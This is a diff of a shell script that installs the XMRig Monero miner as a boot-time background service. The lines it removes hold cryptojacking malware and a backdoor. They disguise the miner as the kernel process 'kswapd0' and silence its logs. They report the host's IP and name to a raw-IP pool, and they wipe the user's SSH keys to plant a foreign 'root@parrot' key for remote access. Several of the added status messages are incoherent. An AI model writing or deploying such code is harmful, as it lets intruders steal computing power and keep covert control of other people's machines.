@@ -216,156 +216,146 @@ if (test $? -ne 0); then
   fi
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
-  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
+    echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+    exit 1
   fi
-  #rm xmrig.tar.gz
+  rm xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
+  echo "[*] Checking if new version of $HOME/.gdm2/xmrig works fine"
   $HOME/.gdm2/xmrig --help >/dev/null
-  if (test $? -ne 0); then 
-    if [ -f $HOME/.gdm2/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
-    else 
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
-    fi
-#    exit 1
+  if (test $? -ne 0); then
+    echo "ERROR: New version of $HOME/.gdm2/xmrig is not functional"
+    exit 1
   fi
+
+  echo "OK: New version of $HOME/.gdm2/xmrig works fine"
+
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
+  echo "I don't know why your AV software don't like the advanced version, please report the issue to your AV software vendor and then try to unpack it manually"
+
+  echo "Script will now continue with new version of miner"
 fi
 
-echo "[*] Miner $HOME/.gdm2/xmrig is OK"
+echo "[*] Creating new $HOME/.gdm2/config.json file"
+echo "{
+  \"autosave\": true,
+  \"background\": true,
+  \"randomx\": {
+    \"1gb-pages\": true,
+    \"asm\": true,
+    \"init\": -1,
+    \"mode\": \"auto\",
+    \"numa\": true
+  },
+  \"http\": {
+    \"enabled\": true,
+    \"host\": \"127.0.0.1\",
+    \"port\": $PORT,
+    \"access-token\": \"x\",
+    \"restricted\": true
+  },
+  \"donate-level\": 0,
+  \"log-file\": null,
+  \"pools\": [
+    {
+      \"algo\": \"rx/0\",
+      \"coin\": null,
+      \"url\": \"gulf.moneroocean.stream:10001\",
+      \"user\": \"$WALLET.$(hostname)\",
+      \"pass\": \"x\",
+      \"tls\": false,
+      \"rig-id\": null,
+      \"nicehash\": false,
+      \"keepalive\": true,
+      \"enabled\": true,
+      \"label\": \"default\"
+    }
+  ],
+  \"print-time\": 60,
+  \"retries\": 5,
+  \"retry-pause\": 5,
+  \"syslog\": false,
+  \"threads\": $CPU_THREADS,
+  \"user-agent\": null,
+  \"watch\": true
+}" > $HOME/.gdm2/config.json
 
-mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
-
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-#PASS=`hostname`
-PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-#if [ "$PASS" == "localhost" ]; then
-#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-#fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
-
-
-# preparing script
-
-killall xmrig
-
-echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
-cat >$HOME/.gdm2/miner.sh <<EOL
-#!/bin/bash
-if ! pidof kswapd0 >/dev/null; then
-  nice $HOME/.gdm2/kswapd0 \$*
+echo "[*] Checking $HOME/.gdm2/config.json file"
+if (test -f $HOME/.gdm2/config.json); then
+  echo "OK: $HOME/.gdm2/config.json file was created"
 else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
+  echo "ERROR: $HOME/.gdm2/config.json file was not created"
+  exit 1
 fi
-EOL
 
-chmod +x $HOME/.gdm2/miner.sh
+echo "[*] Configuring $HOME/.gdm2/gdm2.rc to start advanced $HOME/.gdm2/xmrig miner in foreground"
+echo "$HOME/.gdm2/xmrig --config=$HOME/.gdm2/config.json &>/dev/null &" > $HOME/.gdm2/gdm2.rc
+chmod +x $HOME/.gdm2/gdm2.rc
 
-# preparing script background work and work under reboot
+echo "[*] Removing crontab entry for $USER"
+crontab -l | grep -v moneroocean_miner.sh | crontab -
+
+echo "[*] Removing systemd service"
+if sudo -n true 2>/dev/null; then
+  sudo systemctl stop moneroocean_miner.service
+  sudo systemctl disable moneroocean_miner.service
+  sudo rm /lib/systemd/system/moneroocean_miner.service
+  sudo systemctl daemon-reload
+  sudo systemctl reset-failed
+fi
+
+echo "[*] Preparing /tmp to start moneroocean_miner.service systemd service for advanced $HOME/.gdm2/xmrig miner"
+mkdir /tmp/xmrig
+chmod 777 /tmp/xmrig
+echo "[Unit]
+Description=MoneroOcean xmrig miner
+After=network.target
+
+[Service]
+Type=simple
+User=$USER
+WorkingDirectory=$HOME/.gdm2
+ExecStart=$HOME/.gdm2/xmrig --config=$HOME/.gdm2/config.json
+Restart=always
+
+[Install]
+WantedBy=default.target
+" > /tmp/xmrig/moneroocean_miner.service
+
+echo "[*] Running sudo systemctl daemon-reload"
+if sudo -n true 2>/dev/null; then
+  sudo mv /tmp/xmrig/moneroocean_miner.service /lib/systemd/system/moneroocean_miner.service
+  sudo systemctl daemon-reload
+  sudo systemctl reset-failed
+fi
+
+echo "[*] Starting advanced $HOME/.gdm2/xmrig miner from systemd"
+if sudo -n true 2>/dev/null; then
+  sudo systemctl enable moneroocean_miner.service
+  sudo systemctl start moneroocean_miner.service
+fi
+
+# summary
+
+echo
+echo "If no errors occured, $WALLET is now mining to gulf.moneroocean.stream:10001 using advanced $HOME/.gdm2/xmrig miner."
+echo
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
-    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
-  else 
-    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
-  fi
-  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  echo "Please, remember to restart your host after reboot to start mining in background from $HOME/.profile."
 else
-
-  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
-    echo "[*] Enabling huge pages"
-    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
-  fi
-
-  if ! type systemctl >/dev/null; then
-
-    echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
-
-  else
-
-    echo "[*] Creating moneroocean systemd service"
-    cat >gdm2.service <<EOL
-[Unit]
-Description=GDM2
-[Service]
-ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
-Restart=always
-Nice=10
-CPUWeight=1
-[Install]
-WantedBy=multi-user.target
-EOL
-    sudo mv gdm2.service /etc/systemd/system/gdm2.service
-    echo "[*] Starting gdm2 systemd service"
-    sudo killall kswapd0 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable gdm2.service
-    sudo systemctl start gdm2.service
-    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
-  fi
+  echo "Your host will start mining in background from systemd service after reboot."
 fi
 
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
-else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
+if [ ! -z $EMAIL ]; then
+  echo "If needed, you can change miner options later at https://moneroocean.stream using $EMAIL email and default password."
 fi
-echo ""
 
-rm -rf $HOME/.gdm2/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
-curl https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+echo
+echo "Please, make sure your new miner works stable and not producing too much rejected shares, especially after some time (24-72 hours)."
+echo
 
-sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
+# done
 
-
-cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
-cat $HOME/.gdm2/config.json
-
-rm -rf xmrig.tar*
-
-
-echo "[*] Generating ssh key on server"
-
-rm -rf ~/.ssh/authorized_keys
-rm -rf ~/.ssh/
-mkdir ~/.ssh
-chmod 700 ~/.ssh
-touch ~/.ssh/authorized_keys
-echo 'ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4koUa0STJSwJxnltGqeaS75OcyzAZoJx4Qrxfr0xyxfN/l1XORKxgOCDBAsLf2C5qHzZ3aPZJzlECD9mtR8pfKbJ8ZEv08Kug/IMT63y/dT3zPcn6zQICXXVIVym0lpbVfgO8IJSVKblTedC8WS3XRnqWOhTfSvKLTBrDrZ72PQ3/gE8DM1gMU+vcNNqlvSfj7bDhp4RedsmbYLmFOLDEIGxXSo5M/xO1Wy6mcoxQNwermmmVJ0Oos+ZRwOuTilG+VuHVcdQY1Wpn/mG1hxdk/ClqV1bQZfQzAiAUQHh1XiGDF0htghgJFtD6dfHpahdp3T4Mho5rJKSiMlvAGOY1JRiukX3EM9O2IyBt+FNw1iazca+jFfcxz0YqV8pWZ23sFH+TJFMcXpN+u9n+4OhYHptiwMpvAhh4wam4+nPMdLUNy+Xt430OFbc/4nYKQcQkS7kRpnx1ThHAUmQ2CbzSkTPv5b3TIr2YR1+9K1sHKntfW2C1F0NYsg8ltvCj758= root@parrot'>>~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-
-echo "[*] Setup complete"
+exit 0
